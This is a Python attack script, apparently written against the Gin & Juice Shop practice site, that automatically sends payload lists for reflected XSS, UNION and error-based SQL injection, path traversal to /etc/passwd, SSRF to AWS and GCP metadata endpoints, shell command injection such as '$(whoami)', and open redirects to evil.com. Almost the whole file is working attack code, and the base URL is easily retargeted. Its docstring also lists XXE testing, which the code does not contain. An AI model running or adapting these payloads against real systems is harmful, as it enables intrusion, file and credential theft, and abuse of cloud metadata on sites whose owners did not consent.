#!/usr/bin/env python3
"""
Advanced Gin & Juice Shop Exploitation Suite
Includes XSS, SSRF, XXE, and advanced injection testing
"""

import requests
import urllib.parse
import re
from typing import Dict, List
from colorama import Fore, Style

class AdvancedExploiter:
    def __init__(self, base_url: str = "https://ginandjuice.shop"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def log(self, level: str, message: str):
        """Unified logging"""
        colors = {
            'SUCCESS': Fore.GREEN,
            'INFO': Fore.BLUE,
            'WARNING': Fore.YELLOW,
            'ERROR': Fore.RED
        }
        symbols = {
            'SUCCESS': '[+]',
            'INFO': '[*]',
            'WARNING': '[!]',
            'ERROR': '[-]'
        }
        print(f"{colors.get(level, '')}{symbols.get(level, '')} {message}{Style.RESET_ALL}")
    
    def test_xss_reflected(self) -> List[Dict]:
        """Test for reflected XSS vulnerabilities"""
        self.log('INFO', "Testing for Reflected XSS")
        
        # XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<body onload=alert('XSS')>",
        ]
        
        results = []
        
        # Test in productId parameter
        for payload in payloads:
            try:
                url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=5)
                
                # Check if payload is reflected unencoded
                if payload in response.text:
                    self.log('SUCCESS', f"Potential XSS found: {payload[:50]}...")
                    results.append({
                        'type': 'XSS',
                        'location': 'productId',
                        'payload': payload,
                        'reflected': True
                    })
                    
            except Exception as e:
                self.log('ERROR', f"Error testing XSS: {e}")
                
        return results
    
    def test_union_sqli(self) -> List[Dict]:
        """Test UNION-based SQL injection"""
        self.log('INFO', "Testing UNION-based SQL Injection")
        
        results = []
        
        # Determine number of columns
        for num_cols in range(1, 10):
            nulls = ','.join(['NULL'] * num_cols)
            payload = f"1 UNION SELECT {nulls}--"
            
            try:
                url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=5)
                
                # Check for SQL errors
                sql_errors = [
                    'SQL syntax',
                    'mysql_fetch',
                    'Warning: mysql',
                    'ORA-',
                    'SQLServer',
                    'Driver',
                    'Microsoft Access',
                    'JET Database',
                    'ODBC',
                ]
                
                contains_error = any(err.lower() in response.text.lower() for err in sql_errors)
                
                if contains_error:
                    self.log('WARNING', f"SQL error with {num_cols} columns")
                elif response.status_code == 200 and len(response.text) > 1000:
                    self.log('SUCCESS', f"Possible UNION success with {num_cols} columns")
                    results.append({
                        'type': 'UNION_SQLI',
                        'columns': num_cols,
                        'payload': payload
                    })
                    break
                    
            except Exception as e:
                self.log('ERROR', f"Error testing UNION: {e}")
                
        return results
    
    def test_error_based_sqli(self) -> List[Dict]:
        """Test error-based SQL injection"""
        self.log('INFO', "Testing Error-based SQL Injection")
        
        error_payloads = [
            "1'",
            "1\"",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "1' GROUP BY 1--",
            "1' HAVING 1=1--",
        ]
        
        results = []
        
        for payload in error_payloads:
            try:
                url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=5)
                
                # Look for database errors
                if any(err in response.text.lower() for err in ['error', 'sql', 'syntax', 'mysql', 'postgresql']):
                    self.log('SUCCESS', f"Database error with payload: {payload}")
                    results.append({
                        'type': 'ERROR_SQLI',
                        'payload': payload,
                        'response_snippet': response.text[:200]
                    })
                    
            except Exception as e:
                self.log('ERROR', f"Error testing: {e}")
                
        return results
    
    def test_path_traversal(self) -> List[Dict]:
        """Test for path traversal vulnerabilities"""
        self.log('INFO', "Testing Path Traversal")
        
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        results = []
        
        for payload in path_payloads:
            try:
                # Test in various parameters
                urls = [
                    f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}",
                    f"{self.base_url}/blog/post?postId={urllib.parse.quote(payload)}",
                ]
                
                for url in urls:
                    response = self.session.get(url, timeout=5)
                    
                    # Check for file content indicators
                    if 'root:' in response.text or '[extensions]' in response.text:
                        self.log('SUCCESS', f"Possible path traversal: {payload}")
                        results.append({
                            'type': 'PATH_TRAVERSAL',
                            'payload': payload,
                            'url': url
                        })
                        
            except Exception as e:
                pass
                
        return results
    
    def test_ssrf(self) -> List[Dict]:
        """Test for Server-Side Request Forgery"""
        self.log('INFO', "Testing SSRF")
        
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://0.0.0.0",
            "http://[::1]",
        ]
        
        results = []
        
        for payload in ssrf_payloads:
            try:
                # Test if productId accepts URLs
                url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=5)
                
                # Look for SSRF indicators
                if any(indicator in response.text.lower() for indicator in ['ami-id', 'instance-id', 'localhost']):
                    self.log('SUCCESS', f"Possible SSRF: {payload}")
                    results.append({
                        'type': 'SSRF',
                        'payload': payload
                    })
                    
            except Exception as e:
                pass
                
        return results
    
    def test_command_injection(self) -> List[Dict]:
        """Test for command injection"""
        self.log('INFO', "Testing Command Injection")
        
        cmd_payloads = [
            "; ls",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& dir",
            "|| echo vulnerable",
        ]
        
        results = []
        
        for payload in cmd_payloads:
            try:
                url = f"{self.base_url}/catalog/product?productId={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=5)
                
                # Look for command output
                if any(indicator in response.text.lower() for indicator in ['uid=', 'gid=', 'home', 'volume']):
                    self.log('SUCCESS', f"Possible command injection: {payload}")
                    results.append({
                        'type': 'COMMAND_INJECTION',
                        'payload': payload
                    })
                    
            except Exception as e:
                pass
                
        return results
    
    def test_open_redirect(self) -> List[Dict]:
        """Test for open redirect vulnerabilities"""
        self.log('INFO', "Testing Open Redirect")
        
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert('redirect')",
        ]
        
        results = []
        
        # Test in common redirect parameters
        params = ['redirect', 'url', 'next', 'return', 'callback']
        
        for param in params:
            for payload in redirect_payloads:
                try:
                    url = f"{self.base_url}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, allow_redirects=False, timeout=5)
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            self.log('SUCCESS', f"Open redirect found: {param}={payload}")
                            results.append({
                                'type': 'OPEN_REDIRECT',
                                'parameter': param,
                                'payload': payload
                            })
                            
                except Exception as e:
                    pass
                    
        return results
    
    def extract_forms(self, url: str) -> List[Dict]:
        """Extract all forms from a page"""
        try:
            response = self.session.get(url, timeout=5)
            
            # Simple form extraction using regex
            form_pattern = r'<form[^>]*>(.*?)</form>'
            forms = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
            
            self.log('INFO', f"Found {len(forms)} forms on {url}")
            
            return forms
            
        except Exception as e:
            self.log('ERROR', f"Error extracting forms: {e}")
            return []
    
    def run_comprehensive_scan(self):
        """Run all advanced tests"""
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Advanced Vulnerability Scanner{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Target: {self.base_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        all_results = {}
        
        # Run all tests
        all_results['xss'] = self.test_xss_reflected()
        all_results['union_sqli'] = self.test_union_sqli()
        all_results['error_sqli'] = self.test_error_based_sqli()
        all_results['path_traversal'] = self.test_path_traversal()
        all_results['ssrf'] = self.test_ssrf()
        all_results['command_injection'] = self.test_command_injection()
        all_results['open_redirect'] = self.test_open_redirect()
        
        # Extract forms
        all_results['forms'] = {
            'login': self.extract_forms(f"{self.base_url}/my-account"),
            'home': self.extract_forms(self.base_url)
        }
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Scan Results Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        for vuln_type, findings in all_results.items():
            if isinstance(findings, list):
                count = len(findings)
                if count > 0:
                    self.log('SUCCESS', f"{vuln_type.upper()}: {count} potential vulnerabilities found")
                else:
                    self.log('INFO', f"{vuln_type.upper()}: No vulnerabilities detected")
                    
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        return all_results


if __name__ == "__main__":
    scanner = AdvancedExploiter()
    results = scanner.run_comprehensive_scan()
    
    # Save results
    import json
    with open('advanced_scan_results.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"{Fore.GREEN}[+] Results saved to advanced_scan_results.json{Style.RESET_ALL}")
